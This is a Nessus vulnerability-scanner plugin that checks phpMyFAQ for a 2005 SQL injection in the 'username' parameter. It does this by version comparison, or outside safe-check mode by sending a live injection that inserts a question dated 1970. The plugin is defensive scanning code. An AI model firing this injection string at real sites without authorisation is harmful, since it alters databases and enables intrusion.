#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(17298);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-0702");
  script_bugtraq_id(12741);
  script_osvdb_id(14600);

  script_name(english:"phpMyFAQ Forum Message username Field SQL Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of phpMyFAQ that fails to
sufficiently sanitize the 'username' parameter before using it in SQL
queries.  As a result, a remote attacker can pass malicious input to
database queries, potentially resulting in data exposure, data
modification, or attacks against the database itself." );
 script_set_attribute(attribute:"see_also", value:"http://www.phpmyfaq.de/advisory_2005-03-06.php" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyFAQ version 1.4.7 or 1.5.0 RC2 or greater." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/06");
 script_cvs_date("$Date: 2012/09/10 21:39:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpmyfaq:phpmyfaq");
script_end_attributes();

 
  script_summary(english:"Checks for username SQL injection vulnerability in phpMyFAQ");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");
  script_dependencie("phpmyfaq_detect.nasl", "smtp_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpmyfaq");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpmyfaq"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  if (safe_checks()) {
    # nb: the advisory claims this only affects 1.4 and 1.5 versions;
    #     should we extend it to all earlier versions???
    if (ver =~ "^1\.(4\.[0-6]|5\.0 RC1)")
    {
     security_hole(port);
     set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    }
  }
  else {
    # The code in savequestion.php takes the date as the current date/time
    # when adding a question. Let's see if we can exploit the vulnerability
    # to add a question with a bogus date -- 01/01/1970.
    #
    # nb: although some sites don't seem to advertise the "Add a Question"
    #     link, specifying action=savequestion does seem active.
    email = get_kb_item("SMTP/headers/From");
    if (!email) email = "nobody@example.com";
    r = http_send_recv3(method:"GET", port: port,
      item:string(
        dir, "/index.php?",
        "action=savequestion&",
        "username=n/a','", email, "','','n/a','19700101000000')%20--%20'&",
        # nb: usermail and content will be ignored if the exploit works.
        "usermail=x@y.com&",
        "content=Hi"));
    if (isnull(r)) exit(0);

    # Find our question amongst the list of open questions.
    #
    # nb: there only ever seems to be one page generated, and even so,
    #     a date of 1970 ensures ours will be among the first.
    r = http_send_recv3(method:"GET", item:string(dir, "/index.php?action=open"), port:port);
    if (isnull(r)) exit(0);
    res = r[2];
    email = str_replace(string:email, find:"@", replace:"_AT_");
    email = str_replace(string:email, find:".", replace:"_DOT_");
    if (egrep(string:res, pattern:string('1970.*<br.+ href="mailto:', email))) 
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    }
  }
}
